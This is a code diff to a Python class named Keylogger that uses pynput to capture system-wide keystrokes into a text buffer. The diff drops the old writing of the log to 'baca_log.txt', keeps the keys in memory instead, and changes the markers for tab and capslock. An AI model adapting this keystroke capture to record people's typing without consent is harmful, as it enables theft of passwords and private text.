@@ -3,24 +3,15 @@
 
 from pynput.keyboard import Listener
 import re
-import os
 
 class Keylogger:
     shared_listener = None
 
     def __init__(self):
         self.cursor = 0
-        self.path = 'baca_log.txt'
         self.listener = None
-
-        self.buffer_txt = self.load_initial_log()
-        self.cursor = len(self.buffer_txt)
-
-    def load_initial_log(self):
-        if os.path.exists(self.path):
-            with open(self.path, "r") as f:
-                return f.read()
-        return ""
+        self.keys = []
+        self.buffer_txt = ""
 
     def start_log(self):
         if Keylogger.shared_listener is not None:
@@ -34,13 +25,13 @@ class Keylogger:
             return False
 
         i = re.sub("'", "", str(key))
+        self.keys.append(i)
 
         try:
             if i == "Key.enter":
                 self.buffer_txt = self.buffer_txt[:self.cursor] + "\n" + self.buffer_txt[self.cursor:]
                 self.cursor += 1
-            elif i in ("Key.shift",
-                    "Key.shift_r",
+            elif i in (
                     "Key.ctrl",
                     "Key.ctrl_r",
                     "Key.ctrl_l",
@@ -82,17 +73,15 @@ class Keylogger:
                 if self.cursor > 0:
                     self.cursor -= 1
             elif i == "Key.tab":
-                self.buffer_txt = self.buffer_txt[:self.cursor] + "[TAB]" + self.buffer_txt[self.cursor:]
-                self.cursor += 7
+                self.buffer_txt = self.buffer_txt[:self.cursor] + " !<tab>! " + self.buffer_txt[self.cursor:]
+                self.cursor += len(" !<tab>! ")
             elif i == "Key.caps_lock":
-                self.buffer_txt = self.buffer_txt[:self.cursor] + "[CAPSLOCK]" + self.buffer_txt[self.cursor:]
-                self.cursor += 10
+                self.buffer_txt = self.buffer_txt[:self.cursor] + " !<capslock>! " + self.buffer_txt[self.cursor:]
+                self.cursor += len(" !<capslock>! ")
             else:
                 self.buffer_txt = self.buffer_txt[:self.cursor] + i + self.buffer_txt[self.cursor:]
                 self.cursor += 1
 
-            with open(self.path, "w") as f:
-                f.write(self.buffer_txt)
         except Exception as e:
             print(f"{e}")
 
@@ -110,12 +99,7 @@ class Keylogger:
                 print(f"{e}")
             finally:
                 Keylogger.shared_listener = None
-
-        if os.path.exists(self.path):
-            try:
-                os.remove(self.path)
-            except:
-                pass
             
         self.buffer_txt = ""
+        self.keys = []
         self.cursor = 0
